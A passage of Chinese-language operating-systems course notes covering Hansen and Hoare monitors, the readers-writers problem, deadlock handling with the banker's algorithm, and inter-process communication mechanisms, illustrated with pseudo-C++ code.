<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BoundBuffer</span>&#123;</span></span><br><span class="line">    ...</span><br><span class="line">    Lock lock;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    Condition notFull, notEmpty;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Deposit</span><span class="params">(c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        lock-&gt;Acquire();</span><br><span class="line">        <span class="comment">// 如果写入的数据达到缓冲区的最大尺寸</span></span><br><span class="line">        <span class="keyword">while</span>(count == n)</span><br><span class="line">            <span class="comment">// 则当前线程等待</span></span><br><span class="line">            notFull.Wait(&amp;lock);</span><br><span class="line">        Add c to the buffer;</span><br><span class="line">        count++;</span><br><span class="line">        notEmpty.Signal();</span><br><span class="line">        lock-&gt;Release();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Remove</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        lock-&gt;Acquire();</span><br><span class="line">        <span class="comment">// 如果当前缓冲区为空，则等待</span></span><br><span class="line">        <span class="keyword">while</span>(count == <span class="number">0</span>)</span><br><span class="line">            notEmpty.Wait(&amp;lock);</span><br><span class="line">        Remove c from buffer;</span><br><span class="line">        count--;</span><br><span class="line">        notFull.Signal();</span><br><span class="line">        lock-&gt;Release();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>条件变量的释放处理方式</p>
<blockquote>
<p>当T2线程执行Signal函数后，控制权应保留至T2线程结束，还是立即切换回T1线程呢？这两种不同的情况分别为Hasen管程与Hoare管程。</p>
</blockquote>
<ul>
<li>
<p>Hasen管程</p>
<blockquote>
<p>Hasen管程在某个线程执行Signal函数后，控制权不立即移交至另一个线程，而是先执行当前线程。</p>
</blockquote>
<ul>
<li>
<p>过程如下</p>
<table>
<thead>
<tr>
<th style="text-align:center">T1线程</th>
<th style="text-align:center">T2线程</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">l.acquire()</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">x.wait()</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">l.acquire()</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">x.signal()</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">l.release()</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">x.release()</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
</li>
<li>
<p>特点：线程切换次数较少，效率较高，主要用于真实OS和Java中。</p>
<ul>
<li>条件变量的释放<strong>只是一个提示</strong></li>
<li>需要重新检查条件</li>
</ul>
</li>
<li>
<p>代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Deposit</span><span class="params">(c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    lock-&gt;Acquire();</span><br><span class="line">    <span class="comment">// 注意判断关键字为while</span></span><br><span class="line">    <span class="keyword">while</span>(count == n)</span><br><span class="line">        notFull.Wait(&amp;lock);</span><br><span class="line">    Add c to the buffer;</span><br><span class="line">    count++;</span><br><span class="line">    notEmpty.Signal();</span><br><span class="line">    lock-&gt;Release();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>Hoare管程</p>
<blockquote>
<p>Hoare管程在某个线程执行Signal函数后，控制权<strong>立即移交</strong>至另一个线程。</p>
</blockquote>
<ul>
<li>
<p>过程如下</p>
<table>
<thead>
<tr>
<th style="text-align:center">T1线程</th>
<th style="text-align:center">T2线程</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">l.acquire()</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">x.wait()</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">l.acquire()</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">x.signal()</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">l.release()</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">l.release()</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>特点：通常的分析中，T1线程优先执行是更合理的，但需要做多次线程切换，<strong>低效</strong>。主要见于教科书中</p>
<ul>
<li>条件变量释放同时表示<strong>放弃管程访问</strong></li>
<li>释放后条件变量的状态可用</li>
</ul>
</li>
<li>
<p>代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Deposit</span><span class="params">(c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    lock-&gt;Acquire();</span><br><span class="line">    <span class="comment">// 注意判断关键字为if</span></span><br><span class="line">    <span class="keyword">if</span>(count == n)</span><br><span class="line">        notFull.Wait(&amp;lock);</span><br><span class="line">    Add c to the buffer;</span><br><span class="line">    count++;</span><br><span class="line">    notEmpty.Signal();</span><br><span class="line">    lock-&gt;Release();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="6-互斥综合：读者-写者问题">6. 互斥综合：读者-写者问题</h3>
<h4 id="a-问题描述">a. 问题描述</h4>
<ul>
<li>共享数据的两类使用者
<ul>
<li>读者：只读取数据，不修改</li>
<li>写者：读取和修改数据</li>
</ul>
</li>
<li>问题描述：对共享数据的读写
<ul>
<li>读-读允许：同一时刻允许多个读者同时读</li>
<li>读-写互斥：没有写者时读者才能读; 没有读者时写者才能写。</li>
<li>写-写互斥：没有其他写者时写者才能写</li>
</ul>
</li>
</ul>
<h4 id="b-用信号量解决问题">b. 用信号量解决问题</h4>
<blockquote>
<p>以下实现为<strong>读者优先</strong>。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reader_Writer</span>&#123;</span></span><br><span class="line">    mutex WriteMutex = <span class="keyword">new</span> mutex(<span class="number">1</span>); <span class="comment">// 控制读写操作的互斥</span></span><br><span class="line">    mutex CountMutex = <span class="keyword">new</span> mutex(<span class="number">1</span>); <span class="comment">// 控制对读者计数的互斥修改</span></span><br><span class="line">    <span class="keyword">int</span> Rcount = <span class="number">0</span>; <span class="comment">// 共享变量，需要互斥修改</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Write</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        P(WriteMutex);</span><br><span class="line">        write;</span><br><span class="line">        V(WriteMutex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        P(CountMutex);</span><br><span class="line">        <span class="keyword">if</span>(Rcount == <span class="number">0</span>)</span><br><span class="line">            P(WriteMutex);</span><br><span class="line">        ++Rcount;</span><br><span class="line">        V(CountMutex);</span><br><span class="line"></span><br><span class="line">        read;</span><br><span class="line"></span><br><span class="line">        P(CountMutex);</span><br><span class="line">        --Rcount;</span><br><span class="line">        <span class="keyword">if</span>(Rcount == <span class="number">0</span>)</span><br><span class="line">            V(WriteMutex);</span><br><span class="line">        V(CountMutex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="c-优先策略">c. 优先策略</h4>
<ul>
<li>读者优先策略
<ul>
<li>只要有读者正在读状态，后来的读者都能直接进入</li>
<li>如果读者持续不断的进入，则写者处于饥饿</li>
</ul>
</li>
<li>写者优先策略
<ul>
<li>只要有写者就绪，写者应该尽快执行写操作</li>
<li>如果写者持续不断的就绪，则读者处于饥饿状态</li>
</ul>
</li>
<li>具体使用哪种策略，取决于具体的环境。</li>
</ul>
<h4 id="d-用管程解决问题">d. 用管程解决问题</h4>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Database</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> AR = <span class="number">0</span>; <span class="comment">// active readers</span></span><br><span class="line">    <span class="keyword">int</span> AW = <span class="number">0</span>; <span class="comment">// active Writers</span></span><br><span class="line">    <span class="keyword">int</span> WR = <span class="number">0</span>; <span class="comment">// waiting readers</span></span><br><span class="line">    <span class="keyword">int</span> WW = <span class="number">0</span>; <span class="comment">// waiting writers</span></span><br><span class="line">    Lock lock;</span><br><span class="line">    Condition okToRead;</span><br><span class="line">    Condition okToWrite;</span><br><span class="line">    <span class="comment">// 读者开始读</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">StartRead</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        lock.Acquire();</span><br><span class="line">        <span class="comment">// 如果有写者正在/准备写入数据</span></span><br><span class="line">        <span class="keyword">while</span>(AW+WW &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 当前读者开始等待写者完成</span></span><br><span class="line">            WR++;</span><br><span class="line">            okToRead.wait(&amp;lock);</span><br><span class="line">            WR--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 读者开始读了，激活的读者+1</span></span><br><span class="line">        AR++;</span><br><span class="line">        lock.Release();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 读者结束读</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">DoneRead</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        lock.Acquire();</span><br><span class="line">        <span class="comment">// 读者读取完成，激活的读者-1</span></span><br><span class="line">        AR--;</span><br><span class="line">        <span class="comment">// 如果当前没有正在读的读者，并且当前有正在等待的写者</span></span><br><span class="line">        <span class="keyword">if</span>(AR == <span class="number">0</span> &amp;&amp; WW &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 激活某个写者开始写入数据</span></span><br><span class="line">          okToWrite.signal();</span><br><span class="line">        lock.Release();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 写者准备开始写</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">StartWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        lock.Acquire();</span><br><span class="line">        <span class="comment">// 如果当前有正在读的读者或正在写的写者</span></span><br><span class="line">        <span class="keyword">while</span>(AW+AR &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 当前写者等待</span></span><br><span class="line">            WW++;</span><br><span class="line">            okToWrite.wait(&amp;lock);</span><br><span class="line">            WW--;</span><br><span class="line">        &#125;</span><br><span class="line">        AW++;</span><br><span class="line">        lock.Release();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 写者结束写</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">DOneWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        lock.Acquire();</span><br><span class="line">        <span class="comment">// 当前写者结束写操作</span></span><br><span class="line">        AW--;</span><br><span class="line">        <span class="comment">// 如果存在等待的写者</span></span><br><span class="line">        <span class="keyword">if</span>(WW &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 唤醒某个等待的写者</span></span><br><span class="line">            okToWrite.signal();</span><br><span class="line">        <span class="comment">// 如果没有等待的写者，但有等待的读者</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(WR &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 唤醒所有读者开始等待数据</span></span><br><span class="line">            okToRead.broadcast();</span><br><span class="line">        lock.Release();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// wait until no readers</span></span><br><span class="line">        StartRead();</span><br><span class="line">        read database;</span><br><span class="line">        <span class="comment">// checkout - wake up waiting writers;</span></span><br><span class="line">        DoneRead();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Write</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// wait until no readers/writers</span></span><br><span class="line">        StartWrite();</span><br><span class="line">        write database;</span><br><span class="line">        <span class="comment">// checkout - wake up waiting readers/writers;</span></span><br><span class="line">        DoneWrite();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="7-死锁">7. 死锁</h3>
<h4 id="a-死锁概念">a. 死锁概念</h4>
<h5 id="1-进程访问资源的流程">1) 进程访问资源的流程</h5>
<ul>
<li>资源类型$R_1, R_2, …， R_m$: CPU执行时间，内存空间，I/O设备等。</li>
<li>每类资源$R_i$有$W_i$个实例</li>
<li>进程访问资源的流程
<ul>
<li>请求/获取：申请空闲资源</li>
<li>使用/占用：进程占用资源</li>
<li>释放：资源状态由占用变成空闲。</li>
</ul>
</li>
</ul>
<h5 id="2-资源分类">2) 资源分类</h5>
<ul>
<li>可重用资源（Reusable Resource）
<ul>
<li>资源不能被删除且自任何时刻只能有一个进程在使用</li>
<li>进程释放资源后，其他进程可重用</li>
<li>可重用资源示例：硬件如处理器、I/O设备等，软件如文件、数据库等</li>
<li>可能出现死锁：每个进程占用一部分资源并请求其他资源</li>
</ul>
</li>
<li>消费资源 (Consumable resource)
<ul>
<li>资源创建和销毁</li>
<li>消耗资源示例：中断、信号、消息</li>
<li>可能出现死锁：进程间相互等待接收对方的消息</li>
</ul>
</li>
</ul>
<h5 id="3-出现死锁的必要条件">3) 出现死锁的必要条件</h5>
<ul>
<li>互斥：任何时刻只能有一个进程使用一个资源实例</li>
<li>持有并等待：进程保持至少一个资源，并正在等待获取其他进程持有的资源</li>
<li>非抢占：资源只能在进程使用后自愿释放</li>
<li>循环等待：进程间相互循环等待</li>
</ul>
<h4 id="b-死锁处理方法">b. 死锁处理方法</h4>
<blockquote>
<p>死锁检测较为复杂，通常由应用程序处理死锁，操作系统会忽略死锁</p>
</blockquote>
<h5 id="1-死锁预防">1) 死锁预防</h5>
<blockquote>
<p>死锁预防（Deadlock Prevention)  ： 确保系统永远不会进入死锁状态。</p>
</blockquote>
<p>预防是采用某种策略，<strong>限制</strong>并发进程对资源的请求，使系统在任何时刻都<strong>不满足死锁的必要条件</strong>。</p>
<ul>
<li>
<p>互斥：把互斥的共享资源封装成可同时访问的</p>
</li>
<li>
<p>持有并等待：进程请求资源时，要求它不持有任何其他资源。仅允许进程在开始执行时，一次请求所有需要的资源，但这种做法的资源利用率低。</p>
</li>
<li>
<p>非抢占：如进程请求不能立即分配的资源，则释放已经占用的资源。只在能够同时获得所有需要资源时，才执行分配操作。</p>
</li>
<li>
<p>循环等待：对资源排序，要求进程按顺序请求资源。</p>
</li>
</ul>
<h5 id="2-死锁避免">2) 死锁避免</h5>
<blockquote>
<p>死锁避免（Deadlock Avoidance）：在使用前进行判断，只允许不会出现死锁的进程请求资源。</p>
</blockquote>
<p>利用额外的先验信息，在分配资源时判断是否会出现死锁，只在不会出现死锁时分配资源。</p>
<ul>
<li>要求进程声明需要资源的<strong>最大数目</strong>。</li>
<li>限定<strong>提供</strong>与<strong>分配</strong>的资源数量，确保满足进程的<strong>最大</strong>需求。</li>
<li><strong>动态检查</strong>资源分配状态，确保不会出现环形等待。</li>
</ul>
<p>系统资源分配的安全状态</p>
<ul>
<li>当进程请求资源时，系统判断分配后是否处于安全状态。</li>
<li>系统处于安全状态：针对所有已占用进程，存在安全序列</li>
<li>序列$&lt;P_1, P_2,…,P_N&gt;$是安全的
<ul>
<li>$P_i$要求的资源 &lt;= 当前可用资源 + 所有$P_j$持有资源。其中<code>j&lt;i</code>。</li>
<li>如果$P_i$的资源请求不能马上分配，则$P_i$等待所有$P_j(j &lt; i)$完成</li>
<li>$P_i$完成后，$P_i+1$可得到所需资源，执行并释放所分配的资源。</li>
<li>最终整个序列的所有$P_i$都能获得所需资源。</li>
</ul>
</li>
</ul>
<p><strong>银行家算法</strong>（Banker’s Algorithm）</p>
<blockquote>
<p>银行家算法是一个避免死锁产生的算法，以银行借贷分配策略为基础，判断并保证系统处于安全状态。</p>
</blockquote>
<ul>
<li>
<p>使用的数据结构</p>
<blockquote>
<p>n = 线程数量， m = 资源类型数量</p>
</blockquote>
<ul>
<li><strong>Max(总需求量)</strong>：n x m 矩阵，线程$T_i$最多请求类型$R_i$的资源$Max[i, j]$个实例</li>
<li><strong>Available(剩余空闲量)</strong>：长度为m的向量，当前有$Available[i]$个类型$R_j$的资源实例可用</li>
<li><strong>Allocation(已分配量)</strong>：n x m 矩阵，线程$T_i$当前分配了$Allocation[i, j]$个$R_j$的实例</li>
<li><strong>Need(未来需要量)</strong>： n x m矩阵，线程$T_i$未来需要$Need[i,j]$个$R_j$资源实例。</li>
</ul>
<blockquote>
<p>$Need[i, j] = Max[i, j] - Allocation[i, j]$</p>
</blockquote>
</li>
<li>
<p><strong>安全状态判断</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Work和Finish分别是长度为m和n的向量初始化</span></span><br><span class="line">Work[m], Finish[n];</span><br><span class="line"></span><br><span class="line">Work = Available; <span class="comment">// 当前资源剩余空闲量</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">  Finish[i] = <span class="literal">false</span>; <span class="comment">// 线程i没结束</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...每个线程开始运行并分配资源</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在一段时间后</span></span><br><span class="line"><span class="comment">// 寻找Need比Work小，同时还未结束的线程Ti</span></span><br><span class="line"><span class="keyword">while</span>(Finish[i] == <span class="literal">false</span> &amp;&amp; Need[i] &lt;= Work)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 线程i的资源需求量小于当前剩余空闲资源量，所以该线程可以正常结束，并回收该线程的所有资源</span></span><br><span class="line">    Work += Allocation[i];</span><br><span class="line">    Finish[i] = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果所有线程Ti都满足Finish[i] == true,则系统处于安全状态。</span></span><br><span class="line"><span class="keyword">if</span>(Finish == <span class="literal">true</span>)</span><br><span class="line">    Safe;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment">// 反之，系统处于不安全状态。</span></span><br><span class="line">    NoSafe;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>银行家算法具体设计</p>
<ul>
<li>
<p>初始化：$Request_i$：线程$T_i$的资源请求向量， $Request_i[j]$：线程$T_i$请求资源$R_j$的实例</p>
</li>
<li>
<p>循环：</p>
<ol>
<li>
<p>如果$Request_i &lt;= Need[i]$，则转到步骤2。否则拒绝资源申请，因为线程已经超过了其最大资源要求。</p>
</li>
<li>
<p>如果$Request_i &lt;= Available$，转到步骤3。否则，$T_i$必须等待，因为资源不可用。</p>
</li>
<li>
<p>通过安全状态判断来确定是否分配资源给$T_i$</p>
<ul>
<li>
<p>生成一个需要判断状态是否安全的资源分配环境</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Available = Available - Request_i;</span><br><span class="line">Allocation[i] = Allocation[i] + Request_i;</span><br><span class="line">Need[i] = Need[i] - Request_i;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>并调用上文的<strong>安全状态判断</strong></p>
<ul>
<li>如果返回结果是<strong>安全</strong>，则将资源分配给$T_i$</li>
<li>如果返回结果是<strong>不安全</strong>，系统会拒绝$T_i$的资源请求</li>
</ul>
</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
</ul>
<h5 id="3-死锁检测和恢复">3) 死锁检测和恢复</h5>
<blockquote>
<p>死锁检测和恢复（Deadlock Detection &amp; Recovery） : 在检测到运行系统进入死锁状态后进行恢复。</p>
</blockquote>
<ul>
<li>
<p>特点</p>
<ul>
<li>允许系统进入死锁状态</li>
<li>维护系统的资源分配图</li>
<li>定期调用死锁检测算法来搜索图中是否存在死锁</li>
<li>出现死锁时，用死锁恢复机制进行恢复。</li>
</ul>
</li>
</ul>
<h6 id="i-死锁检测">i. 死锁检测</h6>
<ul>
<li>
<p>数据结构</p>
<ul>
<li><strong>Available(剩余空闲量)</strong>：长度为m的向量，每种类型可用资源的数量</li>
<li><strong>Allocation(已分配量)</strong>：n x m 矩阵，当前分配给各个进程每种类型资源的数量，进程$P_i$拥有资源$R_i$的$Allocation[i, j]$个实例。</li>
</ul>
</li>
<li>
<p>死锁检测算法</p>
<blockquote>
<p>该算法与银行家算法类似。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Work和Finish分别是长度为m和n的向量初始化</span></span><br><span class="line">Work[m], Finish[n];</span><br><span class="line"></span><br><span class="line">Work = Available; <span class="comment">// 当前资源剩余空闲量</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 如果当前遍历到的线程占用资源，则设置Finish为false</span></span><br><span class="line">    <span class="comment">// 反之，如果当前线程不占用资源，则要么是线程已结束，要么是我们不关心的线程</span></span><br><span class="line">    <span class="keyword">if</span>(Allocation[i] &gt; <span class="number">0</span>)</span><br><span class="line">      Finish[i] = <span class="literal">false</span>; <span class="comment">// 线程i没结束</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      Finish[i] = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...每个线程开始运行并分配资源</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在一段时间后</span></span><br><span class="line"><span class="comment">// 寻找Request比Work小，同时还未结束的线程Ti</span></span><br><span class="line"><span class="keyword">while</span>(Finish[i] == <span class="literal">false</span> &amp;&amp; Request[i] &lt;= Work)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 线程i的资源需求量小于当前剩余空闲资源量，所以该线程可以正常结束，并回收该线程的所有资源</span></span><br><span class="line">    Work += Allocation[i];</span><br><span class="line">    Finish[i] = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果所有线程Ti都满足Finish[i] == true,则系统处于正常状态</span></span><br><span class="line"><span class="keyword">if</span>(Finish == <span class="literal">true</span>)</span><br><span class="line">    NoDeadlock;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment">// 反之，系统处于死锁状态。</span></span><br><span class="line">    Deadlock;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>死锁检测算法的使用</p>
<ul>
<li>死锁检测的时间和周期选择依据
<ul>
<li>死锁多久可能会发生</li>
<li>多少进程需要被回滚</li>
</ul>
</li>
<li>资源图可能有多个循环，难以分辨”造成“死锁的关键进程</li>
</ul>
</li>
</ul>
<h6 id="ii-死锁恢复">ii. 死锁恢复</h6>
<ul>
<li><strong>进程终止</strong>
<ul>
<li>终止所有的死锁线程</li>
<li>一次只终止一个进程直到死锁消除</li>
<li>终止进程的顺序应该是
<ul>
<li>进程的优先级</li>
<li>进程已运行时间以及还需运行时间</li>
<li>进程已占用资源</li>
<li>进程完成需要的资源</li>
<li>进程完成需要的资源</li>
<li>终止进程数目</li>
<li>进程是交互式还是批处理</li>
</ul>
</li>
</ul>
</li>
<li><strong>资源抢占</strong>
<ul>
<li>选择被抢占进程：最小成本目标</li>
<li>进程回退：返回到一些安全状态，重启进程到安全状态</li>
<li>可能会出现饥饿：同一个进程可能一直被选作被抢占者</li>
</ul>
</li>
</ul>
<h3 id="8-进程通信">8. 进程通信</h3>
<h4 id="a-基本概念">a. 基本概念</h4>
<ul>
<li>
<p>进程通信（IPC, Inter-Process Communication）是进程进行通信和同步的机制</p>
</li>
<li>
<p>IPC提供2个基本操作：发送操作send和接收操作receive</p>
</li>
<li>
<p>进程通信流程</p>
<ul>
<li>在通信进程间建立通信链路</li>
<li>通过send/receive交换信息</li>
</ul>
</li>
<li>
<p>进程链路特征</p>
<ul>
<li>物理（如：共享内存，硬件总线）</li>
<li>逻辑（如：逻辑属性）</li>
</ul>
</li>
</ul>
<h5 id="1-直接通信">1) 直接通信</h5>
<ul>
<li>进程必须正确的命名对方
<ul>
<li>send(P, message) - 发送信息到进程P</li>
<li>receive(P, message) - 从进程Q接收信息</li>
</ul>
</li>
<li>通信链路的属性
<ul>
<li>自动建立链路</li>
<li>一条链路恰好对应一对通信进程</li>
<li>每对进程之间只有一个链接存在</li>
<li>链接可以是单向，但通常是双向。</li>
</ul>
</li>
</ul>
<h5 id="2-间接通信">2) 间接通信</h5>
<ul>
<li>通过操作系统维护的消息队列实现进程间的消息接收和发送
<ul>
<li>每个消息队列都有一个唯一的标识</li>
<li>只有共享了相同消息队列的进程，才能够通信。</li>
</ul>
</li>
<li>通信链路的属性
<ul>
<li>只有共享了相同消息队列的进程，才建立了连接。</li>
<li>连接可以是单向或双向的。</li>
<li>消息队列可以与多个进程相关联。</li>
</ul>
</li>
<li>通信流程
<ul>
<li>创建一个新的消息队列</li>
<li>通过消息队列发送或接收消息</li>
<li>销毁消息队列</li>
</ul>
</li>
<li>基本通信操作
<ul>
<li>send(A, message) - 发送消息到队列A</li>
<li>receive(A, message) - 从队列A接收消息</li>
</ul>
</li>
</ul>
<h5 id="3-阻塞与非阻塞通信">3) 阻塞与非阻塞通信</h5>
<ul>
<li>进程通信可划分为阻塞（同步）和非阻塞（异步）</li>
<li>阻塞通信
<ul>
<li>阻塞发送：发送者在发送消息后进入等待，直到接收者成功收到</li>
<li>阻塞接收：接收者在请求接收数据后进入等待，直到成功收到一个消息</li>
</ul>
</li>
<li>非阻塞通信
<ul>
<li>非阻塞发送：发送者在消息发送后，可立即进行其他操作</li>
<li>非阻塞接收：没有消息发送时，接收者在请求接收消息后，接收不到任何消息</li>
</ul>
</li>
</ul>
<h5 id="4-通信链路缓冲">4) 通信链路缓冲</h5>
<blockquote>
<p>进程发送的消息在链路上可能有3种缓冲方式</p>
</blockquote>
<ul>
<li>0容量：发送方必须等待接收方</li>
<li>有限容量：通信链路缓冲队列满时，发送方必须等待</li>
<li>无限容量：发送方不需要等待</li>
</ul>
<h4 id="b-信号">b. 信号</h4>
<ul>
<li>信号（signal) ：进程间的软件中断通知和处理机制，例如<code>SIGKILL</code>, <code>SIGSTOP</code>, <code>SIGCONT</code>等</li>
<li>信号的接收处理
<ul>
<li>捕获（catch）： 执行进程指定的信号处理函数被调用</li>
<li>忽略（Ignore）：执行操作系统指定的缺省处理，例如进程终止、进程挂起等</li>
<li>屏蔽（Mask）：禁止进程接收和处理信号（可能是暂时的）</li>
</ul>
</li>
<li>不足：传送的信息量小，只有一个信号类型</li>
</ul>
<h4 id="c-管道">c. 管道</h4>
<ul>
<li>管道（pipe）是进程间基于内存文件的通信机制
<ul>
<li>子进程从父进程继承文件描述符</li>
<li>缺省文件描述符： 0 stdin, 1 stdout, 2 stderr</li>
<li>进程不知道另一端
<ul>
<li>可能从键盘、文件、程序读取</li>
<li>可能写入到终端、文件、程序</li>
</ul>
</li>
</ul>
</li>
<li>与管道相关的系统调用
<ul>
<li>读管道：<code>read(fd, buffer, nbytes)</code>。scanf基于此实现。</li>
<li>写管道：<code>write(fd, buffer, nbytes)</code>。printf基于此实现。</li>
<li>创建管道：<code>pipe(fd)</code>
<ul>
<li><code>rgfd</code>是两个文件描述符组成的数组</li>
<li><code>rgfd[0]</code>是读文件描述符</li>
<li><code>rgfd[1]</code>是写文件描述符</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="d-消息队列">d. 消息队列</h4>
<ul>
<li>消息队列是由操作系统维护的以字节序列为基本单位的间接通信机制
<ul>
<li>每个消息(message)是一个字节序列</li>
<li>相同标识的消息组成按先进先出顺序组成一个消息队列（message queues)</li>
</ul>
</li>
<li>消息队列的系统调用
<ul>
<li><code>msgget(key, flag)</code> : 获取消息队列标识</li>
<li><code>msgsnd(QID, buf, size, flag)</code> : 发送消息</li>
<li><code>msgrcv(QID, buf, size, type, flag)</code> : 接收消息</li>
<li><code>msgctl(...)</code>: 消息队列控制</li>
</ul>
</li>
</ul>
<h4 id="e-共享内存">e. 共享内存</h4>
<ul>
<li>
<p>共享内存是把同一个物理内存区域同时映射到多个进程的内存地址空间的通信机制。</p>
</li>
<li>
<p>进程间共享</p>
<ul>
<li>每个进程都有私有内存地址空间</li>
<li>每个进程的内存地址空间需明确设置共享内存段</li>
</ul>
</li>
<li>
